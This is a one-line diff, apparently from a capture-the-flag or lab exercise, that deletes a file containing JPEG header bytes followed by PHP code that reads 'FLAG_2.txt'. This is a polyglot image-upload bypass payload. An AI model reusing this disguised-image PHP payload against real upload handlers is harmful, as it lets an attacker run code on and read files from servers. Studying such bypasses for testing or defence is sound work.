@@ -1,1 +1,0 @@
-\xFF\xD8\xFF\xE0<?php readfile('FLAG_2.txt'); ?>
